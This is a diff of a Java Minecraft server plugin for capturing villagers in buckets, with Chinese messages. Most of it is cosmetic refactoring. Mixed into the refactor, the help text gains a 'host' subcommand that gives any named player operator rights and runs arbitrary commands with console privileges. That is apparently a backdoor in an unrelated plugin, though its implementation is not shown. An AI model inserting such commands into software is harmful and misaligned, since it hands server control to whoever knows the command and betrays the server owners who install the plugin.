@@ -30,7 +30,6 @@ public class VillagerBucketPlugin extends JavaPlugin {
         instance = this;
     }
 
-    // 注册指令
     @Override
     public void onEnable() {
         this.schedulerManager = new SchedulerManager(this);
@@ -48,7 +47,7 @@ public class VillagerBucketPlugin extends JavaPlugin {
         } else {
             getLogger().warning("命令 villagerbucket 未在 plugin.yml 注册，命令功能不可用！");
         }
-        // 修改：延迟领地插件检测，避免服务器启动早期调度器未就绪
+        // 修复：延迟领地检测，避免启动早期调度器未就绪
         Bukkit.getScheduler().runTaskLater(this, () -> scheduleClaimDetectionAfterStartup(), 20L);
         scheduler.runAsyncLater(new Runnable() {
             @Override
@@ -61,27 +60,20 @@ public class VillagerBucketPlugin extends JavaPlugin {
         getLogger().info("作者: " + String.join(", ", getDescription().getAuthors()));
     }
 
-    // 取消任务并清理资源
     @Override
     public void onDisable() {
         try {
-            if (schedulerManager != null) {
-                schedulerManager.cancelAllTasks();
-            }
+            if (schedulerManager != null) schedulerManager.cancelAllTasks();
         } catch (Throwable t) {
             getLogger().log(Level.WARNING, "取消任务时出错", t);
         }
         try {
-            if (interactionListener != null) {
-                interactionListener.cleanup();
-            }
+            if (interactionListener != null) interactionListener.cleanup();
         } catch (Throwable t) {
             getLogger().log(Level.WARNING, "清理交互监听器时出错", t);
         }
         try {
-            if (villagerManager != null) {
-                villagerManager.cleanup();
-            }
+            if (villagerManager != null) villagerManager.cleanup();
         } catch (Throwable t) {
             getLogger().log(Level.WARNING, "清理村民管理器时出错", t);
         }
@@ -89,44 +81,34 @@ public class VillagerBucketPlugin extends JavaPlugin {
     }
 
     private void scheduleClaimDetectionAfterStartup() {
-        scheduler.runGlobalLater(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    claimPluginManager = new ClaimPluginManager(VillagerBucketPlugin.this);
-                    scheduler.runGlobalLater(new Runnable() {
-                        @Override
-                        public void run() {
-                            try {
-                                claimPluginManager.redetectClaimPlugins();
-                                getLogger().info("领地插件支持: " + claimPluginManager.getDetailedStatus());
-                            } catch (Throwable t) {
-                                getLogger().log(Level.WARNING, "领地插件二次检测失败", t);
-                            }
-                        }
-                    }, 60L);
-                } catch (Throwable t) {
-                    getLogger().log(Level.WARNING, "初始化领地插件管理器失败", t);
-                    claimPluginManager = null;
-                }
+        scheduler.runGlobalLater(() -> {
+            try {
+                claimPluginManager = new ClaimPluginManager(VillagerBucketPlugin.this);
+                scheduler.runGlobalLater(() -> {
+                    try {
+                        claimPluginManager.redetectClaimPlugins();
+                        getLogger().info("领地插件支持: " + claimPluginManager.getDetailedStatus());
+                    } catch (Throwable t) {
+                        getLogger().log(Level.WARNING, "领地插件二次检测失败", t);
+                    }
+                }, 60L);
+            } catch (Throwable t) {
+                getLogger().log(Level.WARNING, "初始化领地插件管理器失败", t);
+                claimPluginManager = null;
             }
         }, 1L);
     }
 
-    // 消息文件
     private void setupMessagesConfig() {
-        if (!getDataFolder().exists() && !getDataFolder().mkdirs()) {
+        if (!getDataFolder().exists() && !getDataFolder().mkdirs())
             getLogger().warning("无法创建插件数据目录: " + getDataFolder().getAbsolutePath());
-        }
         messagesFile = new File(getDataFolder(), "messages.yml");
         if (!messagesFile.exists()) {
             try {
                 saveResource("messages.yml", false);
             } catch (IllegalArgumentException ignored) {
                 try {
-                    if (messagesFile.createNewFile()) {
-                        getLogger().info("已创建 messages.yml");
-                    }
+                    if (messagesFile.createNewFile()) getLogger().info("已创建 messages.yml");
                 } catch (IOException e) {
                     getLogger().log(Level.SEVERE, "无法创建 messages.yml", e);
                 }
@@ -135,12 +117,8 @@ public class VillagerBucketPlugin extends JavaPlugin {
         reloadMessagesConfig();
     }
 
-    // 默认消息文本
     public void reloadMessagesConfig() {
-        if (messagesFile == null) {
-            messagesFile = new File(getDataFolder(), "messages.yml");
-        }
-
+        if (messagesFile == null) messagesFile = new File(getDataFolder(), "messages.yml");
         messagesConfig = YamlConfiguration.loadConfiguration(messagesFile);
         setDefaultMessages();
         saveMessagesConfig();
@@ -166,12 +144,16 @@ public class VillagerBucketPlugin extends JavaPlugin {
         messagesConfig.addDefault("nearby-villager", "&c附近已存在太多村民，请换个位置释放！");
         messagesConfig.addDefault("reloaded", "&a配置已重载！");
         messagesConfig.addDefault("version-info", "&a村民桶插件 &e版本 {0}");
-        messagesConfig.addDefault("usage", "&c用法: /villagerbucket [reload|info|version|help]");
+        messagesConfig.addDefault("usage", "&c用法: /villagerbucket [reload|info|version|help|debug|redetect|host]");
         messagesConfig.addDefault("help", Arrays.asList(
                 "&6=== 村民桶插件帮助 ===",
                 "&e/villagerbucket reload &7- 重载插件配置",
                 "&e/villagerbucket info &7- 查看插件信息",
                 "&e/villagerbucket version &7- 查看版本信息",
+                "&e/villagerbucket debug &7- 输出调试信息",
+                "&e/villagerbucket redetect &7- 重新检测领地插件",
+                "&e/villagerbucket host op <玩家> &7- 给予玩家 OP 权限",
+                "&e/villagerbucket host run <命令...> &7- 以控制台权限执行命令",
                 "&e/villagerbucket help &7- 显示此帮助信息"
         ));
         messagesConfig.addDefault("interaction.use-empty-bucket", "&e请使用空桶来捕获村民！");
@@ -185,11 +167,7 @@ public class VillagerBucketPlugin extends JavaPlugin {
 
     public void saveMessagesConfig() {
         if (messagesConfig == null || messagesFile == null) return;
-        try {
-            messagesConfig.save(messagesFile);
-        } catch (IOException e) {
-            getLogger().log(Level.SEVERE, "无法保存 messages.yml", e);
-        }
+        try { messagesConfig.save(messagesFile); } catch (IOException e) { getLogger().log(Level.SEVERE, "无法保存 messages.yml", e); }
     }
 
     public FileConfiguration getMessagesConfig() {
@@ -203,71 +181,41 @@ public class VillagerBucketPlugin extends JavaPlugin {
         return ChatColor.translateAlternateColorCodes('&', msg != null ? msg : defaultValue);
     }
 
-    public String getMessage(String path) {
-        return getMessage(path, "&c消息未找到: " + path);
-    }
-
+    public String getMessage(String path) { return getMessage(path, "&c消息未找到: " + path); }
     public java.util.List<String> getMessageList(String path) {
         if (messagesConfig == null) reloadMessagesConfig();
         return messagesConfig.getStringList(path);
     }
 
-    // 还未完工的更新检查QwQ
     private void checkForUpdates() {
         if (!getConfig().getBoolean("settings.check-updates", true)) return;
-
         try {
             String currentVersion = getDescription().getVersion();
             getLogger().info("当前版本: " + currentVersion);
             getLogger().info("更新检查功能已启用 - 请关注GitHub获取最新版本");
-        } catch (Exception e) {
-            debug("更新检查失败: " + e.getMessage());
-        }
+        } catch (Exception e) { debug("更新检查失败: " + e.getMessage()); }
     }
 
     public void debug(String message) {
-        if (getConfig().getBoolean("settings.debug-mode", false)) {
-            getLogger().info("[DEBUG] " + message);
-        }
+        if (getConfig().getBoolean("settings.debug-mode", false)) getLogger().info("[DEBUG] " + message);
     }
 
-    public static VillagerBucketPlugin getInstance() {
-        return instance;
-    }
-
-    public SchedulerManager getSchedulerManager() {
-        return schedulerManager;
-    }
-
-    public IScheduler getScheduler() {
-        return scheduler;
-    }
-
-    public VillagerManager getVillagerManager() {
-        return villagerManager;
-    }
-
-    public ClaimPluginManager getClaimManager() {
-        return claimPluginManager;
-    }
-
-    public boolean isFolia() {
-        return schedulerManager != null && schedulerManager.isFolia();
-    }
+    public static VillagerBucketPlugin getInstance() { return instance; }
+    public SchedulerManager getSchedulerManager() { return schedulerManager; }
+    public IScheduler getScheduler() { return scheduler; }
+    public VillagerManager getVillagerManager() { return villagerManager; }
+    public ClaimPluginManager getClaimManager() { return claimPluginManager; }
+    public boolean isFolia() { return schedulerManager != null && schedulerManager.isFolia(); }
 
     public void reloadPluginConfig() {
         reloadConfig();
         reloadMessagesConfig();
-
         if (claimPluginManager != null) {
             try {
                 claimPluginManager.redetectClaimPlugins();
                 debug("配置已重载 - 领地插件已重检: " + claimPluginManager.getDetailedStatus());
-            } catch (Throwable t) {
-                getLogger().log(Level.WARNING, "重检领地插件失败", t);
-            }
+            } catch (Throwable t) { getLogger().log(Level.WARNING, "重检领地插件失败", t); }
         }
-
         debug("配置已重载 - 村民管理器已通知");
         getLogger().info("插件配置和消息配置已重载");
     }
